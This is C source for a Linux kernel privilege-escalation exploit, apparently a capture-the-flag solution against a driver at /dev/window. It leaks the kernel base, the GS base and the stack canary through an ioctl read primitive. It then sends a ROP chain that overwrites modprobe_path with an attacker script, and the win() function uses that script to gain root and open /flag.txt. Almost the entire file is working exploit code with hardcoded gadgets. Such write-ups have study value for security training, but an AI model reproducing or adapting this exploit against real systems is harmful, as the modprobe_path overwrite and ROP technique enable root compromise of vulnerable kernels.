#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

void fatal(char *m){
  printf("ERROR: %s\n", m);
  exit(-1);
}

void hexdump(char *c, unsigned int Count){
  char * CharBuffer[16];
  int i;
  for (i = 0; i < Count; i += 1) {

        if ((i % 16) == 0) { printf("%08lx:", i); }

        printf(" %02x", c[i]);

        CharBuffer[i%16] = (c[i] > 31 && c[i] < 127 ? c[i] : '.');

        if ((i % 16) == 15) { printf(" %16s\n", CharBuffer); }
    }
}

struct ioctl_s {
  void *addr;
  char content[256];
};

// At this addr, there is a pointer to kernel
#define LEAK_ADDR 0xfffffe0000002f50;
#define OFFSET_TEXT 0x1000b59;

// Symbol at addr 0xffffffff83744050 contains pointer to $GS + 0x6ff8c0
//ffffffff81000000
#define BSS_LEAK_OFFSET 0x2744050;
#define GS_LEAK_OFFSET 0x6ff8c0;
#define GS_CANARY_OFF 0x28;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void win(){
  puts("in win");
   // prepare malicious modprobe path
        system("echo -e '#!/bin/sh\nchmod 777 /flag.txt' > /tmp/pwned.sh");
        system("chmod +x /tmp/pwned.sh");
        system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
        system("chmod +x /tmp/pwn");

        // call /tmp/xpl.sh with root permissions via modprobe_path
        system("/tmp/pwn");
        system("cat /flag.txt");
}

unsigned long user_rip = (unsigned long)win;


int main() {
  int ret;
  unsigned long base_addr, gs_addr, canary;

  save_state();
  int fd = open("/dev/window", O_RDWR);
  if (fd < 0){ fatal("opening /dev/window"); }

  struct  ioctl_s * leak = malloc(sizeof(struct ioctl_s));
  leak->addr = LEAK_ADDR;

  ret = ioctl(fd, 0x1337, leak);
  if (ret < 0){ fatal("ioctl"); }

  printf("LEAK: %lx\n",((unsigned long *)leak->content)[0]);
  base_addr = ((unsigned long *)leak->content)[0] - OFFSET_TEXT;
  printf("Base addr: %lx\n",base_addr);
  
  // Leak GS base
  leak->addr = base_addr + BSS_LEAK_OFFSET;
  ret = ioctl(fd, 0x1337, leak);
  if (ret < 0){ fatal("ioctl"); }
  printf("LEAK: %lx\n",((unsigned long *)leak->content)[0]);
  gs_addr = ((unsigned long *)leak->content)[0] - GS_LEAK_OFFSET;
  printf("GS addr: %lx\n",gs_addr);

  // Canary leak
  leak->addr = gs_addr + GS_CANARY_OFF;
  ret = ioctl(fd, 0x1337, leak);
  if (ret < 0){ fatal("ioctl"); }
  canary = ((unsigned long *)leak->content)[0];
  printf("Canary: %lx\n",canary);


  // GADGETS
  unsigned long kernel_base = 0xffffffff81000000;
  //#define kernel_base 0xffffffff81000000;
  unsigned long POP_RDI=0xffffffff8101d675-kernel_base;
  unsigned long POP_RSI= (0xffffffff8106ff0c-kernel_base);
  unsigned long POP_RDX= (0xffffffff817baf4a-kernel_base);

  unsigned long copy_from_user= (0xffffffff816e5d00-kernel_base);
  unsigned long modprobe_path=  (0xffffffff8308c500-kernel_base);
  unsigned long swapgs_func=    (0x1001126);

    unsigned long toto = (modprobe_path)+base_addr;
    printf("modprobe_path: %lx\n",toto);


  unsigned char *payload = malloc(0x200);
  unsigned long *rop;
  char new_path[20] = "/tmp/pwned.sh";

  size_t offset = 64;

  memset(payload,'A', offset);
  rop = (unsigned long *)(payload + offset);

  *rop++ = canary;
  *rop++ = 0xdeadbeef; // saved_RBP

  // set modprobe_path to /tmp/xpl.sh
  // copy_from_user(modprobe_path, new_path, strlen(new_path))
  *rop++ = POP_RDI+base_addr;
  *rop++ = modprobe_path+base_addr;
  *rop++ = POP_RSI+base_addr;
  *rop++ = (unsigned long)new_path;
  *rop++ = POP_RDX+base_addr;
  *rop++ = strlen(new_path)+1;
  *rop++ = copy_from_user+base_addr;

  *rop++ = swapgs_func+base_addr;
  *rop++ = 0;
  *rop++ = 0;
  *rop++ = user_rip;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp;
  *rop++ = user_ss;

  write(fd, payload, 0x200);
}
